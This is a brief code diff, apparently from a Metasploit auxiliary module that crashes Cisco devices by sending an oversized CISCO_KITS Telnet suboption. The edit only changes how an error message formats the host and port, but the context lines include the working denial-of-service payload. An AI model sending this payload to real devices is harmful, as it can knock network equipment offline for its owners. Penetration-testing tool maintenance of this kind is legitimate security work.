@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
     sock.put("\xff\xfa\x24\x00\x03CISCO_KITS\x012:" + Rex::Text.rand_text_alpha(1000) + ":1:\xff\xf0")
     disconnect
   rescue ::Rex::ConnectionRefused
-    print_status "Unable to connect to #{rhost}:#{rport}."
+    print_status "Unable to connect to #{Rex::Socket.to_authority(rhost, rport)}."
   rescue ::Errno::ECONNRESET
     print_good "DoS packet successful. #{rhost} not responding."
   end
